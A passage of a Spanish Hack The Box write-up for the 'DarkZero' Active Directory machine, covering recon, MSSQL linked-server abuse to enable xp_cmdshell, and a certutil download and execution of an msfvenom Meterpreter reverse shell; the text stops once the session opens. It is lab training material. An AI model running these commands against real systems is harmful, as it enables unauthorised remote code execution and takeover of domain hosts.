---
title: "DarkZero - Hack The Box"
date: 2025-10-11
draft: false
slug: "htb-writeup-darkZero"
excerpt: "Esta fue una máquina bastante complicada. Después de analizar los escaneos y de probar las credenciales que nos dieron, nos enfocamos en el servicio MSSQL, siendo aquí donde encontramos un Linked Server que nos conecta a una segunda máquina AD. Conectándonos a esta segunda máquina desde MSSQL, nos permite habilitar el xp_cmdshell para ejecutar comandos de forma remota. Gracias a esto, podemos cargar una Reverse Shell con la que obtenemos una sesión de Meterpreter de Metasploit Framework. Utilizamos esta sesión para usar el módulo local_exploit_suggester, con tal de encontrar una forma de escalar privilegios, siendo así que descubrimos que la máquina es vulnerable al Windows Kernel Elevation of Privilege Vulnerability (CVE-2024-30088). Usamos el módulo cve_2024_30088_authz_basep y logramos escalar privilegios en la segunda máquina AD, convirtiéndonos en Administrador. Analizando la conexión entre el AD1 y el AD2, utilizamos la herramienta Rubeus.exe para capturar un TGT, que se almacena localmente en el AD2 al recibir una consulta del AD1 desde el servicio MSSQL. Usamos este TGT para dumpear los LSA Secrets con el fin de obtener el Hash NTLM del administrador de la máquina AD1, y así conseguir una sesión del AD1 usando evil-winrm, logrando escalar privilegios."
categories: ["HackTheBox", "Hard Machine"]
tags: ["Windows", "Active Directory", "RPC", "DNS", "SMB", "LDAP", "MSSQL", "DNS Enumeration", "RPC Enumeration", "MSSQL Enumeration", "Abusing Linked Server On MSSQL", "Enabling xp_cmdshell (RCE)", "Abusing xp_cmdshell To Load Reverse Shell", "Windows Kernel Elevation of Privilege Vulnerability (CVE-2024-30088)", "CVE-2024-30088", "Reverse Port Forwarding", "Pivoting", "Capturing Ticket Granting Ticket (TGT) with Rubeus", "Pass-the-Ticket (PtT)", "Dumping LSA Secrets", "Privesc - Pass-the-Ticket (PtT)", "Privesc - Dumping LSA Secrets", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "nxc"
  - "rpcclient"
  - "dig"
  - "impacket-mssqlclient"
  - "enum_links"
  - "use_link"
  - "enable_xp_cmdshell"
  - "xp_cmdshell"
  - "certutil"
  - "msfvenom"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: exploit/multi/handler"
  - "nc.exe"
  - "rlwrap"
  - "nc"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "Módulo: exploit/windows/local/cve_2024_30088_authz_basep"
  - "Módulo: Kiwi"
  - "Chisel"
  - "python3"
  - "socat"
  - "impacket-psexec"
  - "Rubeus.exe"
  - "xp_dirtree"
  - "nano"
  - "cat"
  - "base64"
  - "impacket-ticketConverter"
  - "export"
  - "nslookup"
  - "ntpdate"
  - "rdat"
  - "impacket-secretsdump"
  - "evil-winrm"
links:
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html"
  - "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
  - "https://github.com/61106960/adPEAS"
  - "https://github.com/tykawaii98/CVE-2024-30088?tab=readme-ov-file"
  - "https://github.com/Zombie-Kaiser/CVE-2024-30088-Windows-poc?tab=readme-ov-file"
  - "https://github.com/jpillora/chisel/releases/tag/v1.11.3"
  - "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries"
  - "https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-darkzero/darkzero.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.89
PING 10.10.11.89 (10.10.11.89) 56(84) bytes of data.
64 bytes from 10.10.11.89: icmp_seq=1 ttl=127 time=140 ms
64 bytes from 10.10.11.89: icmp_seq=2 ttl=127 time=229 ms
64 bytes from 10.10.11.89: icmp_seq=3 ttl=127 time=115 ms
64 bytes from 10.10.11.89: icmp_seq=4 ttl=127 time=75.1 ms

--- 10.10.11.89 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 75.093/139.740/228.934/56.452 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.89 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 21:53 CST
Initiating SYN Stealth Scan at 21:53
Scanning 10.10.11.89 [65535 ports]
Discovered open port 53/tcp on 10.10.11.89
Discovered open port 139/tcp on 10.10.11.89
Discovered open port 135/tcp on 10.10.11.89
Discovered open port 445/tcp on 10.10.11.89
Discovered open port 49940/tcp on 10.10.11.89
Discovered open port 49664/tcp on 10.10.11.89
Discovered open port 9389/tcp on 10.10.11.89
Discovered open port 49682/tcp on 10.10.11.89
Discovered open port 49901/tcp on 10.10.11.89
Discovered open port 3268/tcp on 10.10.11.89
Discovered open port 64023/tcp on 10.10.11.89
Discovered open port 636/tcp on 10.10.11.89
Discovered open port 464/tcp on 10.10.11.89
Discovered open port 49667/tcp on 10.10.11.89
Discovered open port 2179/tcp on 10.10.11.89
Discovered open port 3269/tcp on 10.10.11.89
Discovered open port 49683/tcp on 10.10.11.89
Discovered open port 49987/tcp on 10.10.11.89
Discovered open port 5985/tcp on 10.10.11.89
Discovered open port 1433/tcp on 10.10.11.89
Discovered open port 593/tcp on 10.10.11.89
Discovered open port 88/tcp on 10.10.11.89
Completed SYN Stealth Scan at 21:54, 54.36s elapsed (65535 total ports)
Nmap scan report for 10.10.11.89
Host is up, received user-set (0.28s latency).
Scanned at 2025-10-09 21:53:12 CST for 54s
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49901/tcp open  unknown          syn-ack ttl 127
49940/tcp open  unknown          syn-ack ttl 127
49987/tcp open  unknown          syn-ack ttl 127
64023/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.43 seconds
           Raw packets sent: 262117 (11.533MB) | Rcvd: 74 (3.252KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
>

Al ver el **puerto 88** que es del **servicio Kerberos**, nos damos cuenta de que estamos contra una máquina **Active Directory**.

Además, se me hace curioso ver el **puerto 1433** abierto, pues es del **servicio MSSQL**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,445,464,593,636,1433,2179,3268,3269,5985,9389,49664,49667,49682,49683,49901,49940,49987,64023 10.10.11.89 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 21:56 CST
Nmap scan report for 10.10.11.89
Host is up (0.078s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 10:56:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM

|_ssl-date: 2025-10-10T10:58:22+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-10T10:35:07
|_Not valid after:  2055-10-10T10:35:07
| ms-sql-ntlm-info: 
|   10.10.11.89:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.10.11.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)

|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)

|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49901/tcp open  msrpc         Microsoft Windows RPC
49940/tcp open  msrpc         Microsoft Windows RPC
49987/tcp open  msrpc         Microsoft Windows RPC
64023/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-10T10:57:42
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.24 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Tenemos bastante información. Vamos a desglosarla:
* El **puerto 636,3269,3268** nos muestra el dominio del **AD**, siendo **DC01.darkzero.htb**.
* El **puerto 1433**, que es del **servicio MSSQL**, nos muestra la versión usada y también nos muestra el dominio.
* El **servicio SMB** nos indica que se necesitan credenciales válidas para entrar y/o listar los recursos compartidos.

En esta ocasión, tenemos unas credenciales válidas que podemos usar en la máquina. 

Estas son: **john.w:RFulUtONCOL!**.

Aunque no sabemos para qué servicios es útil, por lo que debemos comprobarlo.

Pero antes de comenzar, registremos el dominio en el `/etc/hosts`:
```bash
echo "10.10.11.89 darkzero.htb DC01.darkzero.htb" >> /etc/hosts
```
Continuemos.

## Análisis de Vulnerabilidades {#Analisis}

### Comprobando la Utilidad de Credenciales con netexec {#Creds}

La idea es probar en qué servicios nos son útiles las credenciales que nos dieron.

Para esto, utilizaremos la herramienta **netexec** y probaremos varios servicios:

* Comprobemos si sirve para el **servicio SMB**:
```bash
nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
SMB         10.10.11.89     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.89     445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
```
Estas credenciales SÍ funcionan para este servicio.

* Comprobemos si sirve para el **servicio LDAP**:
```bash
nxc ldap 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
LDAP        10.10.11.89     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
LDAPS       10.10.11.89     636    DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
```
Estas credenciales SÍ funcionan para este servicio.

* Comprobemos si sirve para el **servicio MSSQL**:
```bash
nxc mssql 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
MSSQL       10.10.11.89     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
MSSQL       10.10.11.89     1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
```
Estas credenciales SÍ funcionan para este servicio.

* Comprobemos si sirve para el **servicio WinRM**:
```bash
nxc winrm 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
WINRM       10.10.11.89     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
WINRM       10.10.11.89     5985   DC01             [-] darkzero.htb\john.w:RFulUtONCOL!
```
Estas credenciales NO funcionan para este servicio.

Para el **servicio RPC**, usaremos la herramienta **rpcclient**:
```bash
rpcclient -U 'darkzero.htb/john.w%RFulUtONCOL!' 10.10.11.89
rpcclient $>
```
Funcionan.

Ahora, podemos enumerar varios servicios en busca de información que nos ayude. 

Es posible que me salte algunos servicios, si es que no encuentro nada relevante que mostrar.

### Enumeración de Protocolo DNS {#DNS}

Vamos a comenzar por enumerar el **protocolo DNS** con la herramienta **dig**.

Lo principal es obtener todos los **registros DNS** disponibles del dominio del **AD**:
```bash
dig @10.10.11.89 DC01.darkzero.htb ANY

; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.10.11.89 DC01.darkzero.htb ANY
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16612
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;DC01.darkzero.htb.		IN	ANY

;; ANSWER SECTION:
DC01.darkzero.htb.	3600	IN	A	10.10.11.89
DC01.darkzero.htb.	3600	IN	A	172.16.20.1

;; Query time: 292 msec
;; SERVER: 10.10.11.89#53(10.10.11.89) (TCP)
;; WHEN: Sat Oct 11 20:50:05 CST 2025
;; MSG SIZE  rcvd: 78
```

Excelente, tenemos buena información:
* Para obtener todos los **registros DNS**, utilizamos la flag **ANY**, siendo así que nos muestra 2 registros.
* Analizando los registros, vemos que hay uno que corresponde a una IP distinta a la de la máquina. Podemos suponer que es una IP interna de algún contenedor que están utilizando.
* El hecho de ver una IP interna, indica que hay fuga de información en el **DNS**.

Vamos a guardar esta información sobre la segunda IP para más adelante.

Identifiquemos los servidores de nombres autorizados para el dominio con la flag **NS**:
```bash
dig @10.10.11.89 DC01.darkzero.htb NS

; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.10.11.89 DC01.darkzero.htb ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25811
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;DC01.darkzero.htb.		IN	NS

;; AUTHORITY SECTION:
darkzero.htb.		3600	IN	SOA	DC01.darkzero.htb. hostmaster.darkzero.htb. 435 900 600 86400 3600

;; Query time: 264 msec
;; SERVER: 10.10.11.89#53(10.10.11.89) (UDP)
;; WHEN: Sat Oct 11 20:46:18 CST 2025
;; MSG SIZE  rcvd: 93
```
Bien, aunque no obtuvimos los **registros NS**, sí obtuvimos el **registro SOA** en la sección **AUTHORITY** para la zona **darkzero.htb**, que aquí igual comprobamos el dominio del **AD**.

Pasemos a otro servicio.

### Enumeración de Servicio RPC {#RPC}

Ya comprobamos que podemos entrar al **servicio RPC**, por lo que solo volvemos a entrar con la herramienta **rcpclient**.

Obtengamos los usuarios registrados en la máquina:
```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.w] rid:[0xa2b
```
Vemos nuestro **usuario john.w** y los usuarios por defecto, aparte del **Administrador**.

Obtengamos los grupos existentes:
```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[Forest Trust Accounts] rid:[0x210]
group:[External Trust Accounts] rid:[0x211]
group:[DnsUpdateProxy] rid:[0x44e]
```
Son varios grupos, pero no veo uno del que nos podamos aprovechar por ahora.

Por último, obtengamos la descripción de los usuarios por si hay alguna pista o algo que nos ayude:
```bash
rpcclient $> querydispinfo
index: 0x12be RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x12bf RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x1539 RID: 0xa2b acb: 0x00000210 Account: john.w	Name: (null)	Desc: (null)
index: 0x13d0 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
```
Nada, pero gracias a esta enumeración, comprobamos los usuarios y grupos de la máquina víctima.

Continuemos con otro servicio.

### Enumeración del Servicio MSSQL {#MSSQL}

Entremos al **servicio MSSQL** usando una herramienta de la **suit de Impacket**:
```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```
Vemos que entramos como el **usuario guest** en la base de datos actual.

De igual forma, podemos confirmar el usuario con el que nos logueamos y el usuario que nos asignan al entrar a la base de datos:
```bash
SQL (darkzero\john.w  guest@master)> SELECT SUSER_SNAME();
                  
---------------   
darkzero\john.w   

SQL (darkzero\john.w  guest@master)> SELECT USER_NAME();
        
-----   
guest
```
Entonces, somos el **usuario guest** en la BD.

Veamos qué comandos podemos ejecutar:
```bash
SQL (darkzero\john.w  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
```
Podemos ejecutar varios comandos, pero lo importante es activar la shell para ejecutar comandos.

Intentémoslo:
```bash
SQL (darkzero\john.w  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```
No podemos, no tenemos los suficientes privilegios.

Quizá exista una base de datos con un usuario y contraseña con más privilegios:
```bash
SQL (darkzero\john.w  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1
```
Solo están las bases de dato por defecto.

Veamos qué usuarios de la BD actual existen:
```bash
SQL (darkzero\john.w  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   

guest                public     NULL        NULL        guest           b'2         '   b'00'   

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   

sys                  public     NULL        NULL        NULL            b'4         '    NULL
```
Solo están los usuarios por defecto, entre ellos, nuestro **usuario guest**.

Podemos encontrar algo interesante al listar los **linked servers** que son puertas a otras máquinas:
```bash
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```
Podemos ver un segundo dominio que es posible que podamos visitar con el comando **use_link**.

## Explotación de Vulnerabilidades {#Explotacion}

### Conectandonos a Segunda Máquina (AD2) desde Servicio MSSQL de Máquina Principal (AD1) {#AD2}

Antes de continuar, vamos a explicar un poco lo que vamos a hacer y para eso, necesitamos conocer el concepto **Linked Server** y qué hace el comando **enum_links** y **use_link**.

| **Linked Server** |
|:-----------------:|
| *Un linked server en MSSQL es una conexión configurada desde un servidor SQL a otro origen de datos (otro SQL Server, Oracle, OLE DB provider, etc.). Permite ejecutar consultas remotas como si fueran locales (four-part names, OPENQUERY, EXEC (...) AT <srv>, etc.).* |

| **Comando enum_links** |
|:----------------------:|
| *enum_links es un helper que en tu shell lista los linked servers conocidos desde la instancia actual. Debe mostrar (dependiendo de la implementación) al menos: Nombre del linked server (p. ej. REMOTE_SQL, LINK_SQL01), Proveedor / tipo (SQL Server, OLE DB provider, Oracle, etc.), Data source o servidor destino (hostname o IP), etc.* |

| **Comando use_link** |
|:----------------------:|
| *use_link <link> en tu shell cambia el contexto de operaciones al linked server indicado. Es decir, los comandos siguientes (helpers como enum_db, enum_logins, enum_users, xp_cmdshell si se ejecuta remotamente, etc.) se ejecutarán en el servidor remoto en lugar del local.* |

En resumen, lo que haremos ahora será conectarnos a un servidor remoto que está enlazado al **servidor SQL** del **AD** de manera interna.

Para no confundirnos, este servidor lo llamaremos **AD2** (que prácticamente es eso).

Conectémonos al **AD2** usando el comando **use_link**:
```bash
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
```
Estamos dentro.

Veamos con qué usuario nos autenticó:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> SELECT SUSER_SNAME();
               
------------   
dc01_sql_svc   

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> SELECT USER_NAME();
      
---   
dbo
```
En el **AD2** somos el **usuario sql_svc** y en la BD actual somos el **usuario dbo**, es decir, dentro de la BD tenemos más privilegios.

Ya deberíamos poder activar la **xp_cmdshell**:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```
Sí pudimos.

Comprobemos nuestro usuario en el **AD2**:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "whoami"
output                 
--------------------   
darkzero-ext\svc_sql   

NULL
```
Sí somos el **usuario sql_svc**.

Veamos qué IP tiene el **AD2**:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "ipconfig"
output                                                 
----------------------------------------------------   
NULL                                                   
...
Ethernet adapter Ethernet:                             

NULL                                                   

   Connection-specific DNS Suffix  . :                 

   IPv4 Address. . . . . . . . . . . : 172.16.20.2     

   Subnet Mask . . . . . . . . . . . : 255.255.255.0   

   Default Gateway . . . . . . . . . : 172.16.20.1     

NULL
```
Bien, está en el mismo segmento que vimos cuando enumeramos el **servicio DNS**.

Podemos comprobar si la **máquina AD2** puede alcanzar a nuestra máquina:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "ping Tu_IP"
output                                                     
--------------------------------------------------------   
NULL                                                       

Pinging Tu_IP with 32 bytes of data:                 

Reply from Tu_IP: bytes=32 time=73ms TTL=62          
...

Ping statistics for Tu_IP:                           

    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),   

Approximate round trip times in milli-seconds:             

    Minimum = 73ms, Maximum = 75ms, Average = 73ms
```
Sí pudo. 

Esto quiere decir que el **AD2** permite conexiones salientes, por lo que no es tan necesario aplicar **Port Forwarding**, solo si queremos alcanzar el **AD2** desde nuestra máquina.

Entonces, intentemos ganar acceso a la **máquina AD2**.

#### Obteniendo Sesion de Meterpreter de Máquina AD2 {#Meterpreter}

Veamos si podemos obtener una sesión de **Meterpreter**.

Primero crea una **Reverse Shell de Meterpreter** con **msfvenom**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=4433 -f exe -o revShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: revShell.exe
```

Inicia **Metasploit Framework** y carga el **módulo Handler**:
```bash
msfconsole -q

[*] Starting persistent handler(s)...
msf > use exploit/multi/handler
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > set LPORT 4433
LPORT => 4433
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on Tu_IP:4433
```

Carga la **Reverse Shell** en el **AD2** desde el **AD1** usando **xp_cmdshell** (recuerda que debes tener un servidor de **python3** activo donde tengas la **Reverse Shell**):
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "mkdir C:\Temp"
...
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "certutil.exe -urlcache -split -f http://Tu_IP/revShell.exe C:\Temp\revShell.exe"
output                                                
...
CertUtil: -URLCache command completed successfully.
```

Ejecuta la **Reverse Shell**:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "revShell.exe"
```

Observa la sesión de **Metasploit**:
```bash
[*] Sending stage (203846 bytes) to 10.10.11.89
[*] Meterpreter session 1 opened (Tu_IP:4433 -> 10.10.11.89:59867) at 2025-10-12 15:50:54 -0600

meterpreter > getuid
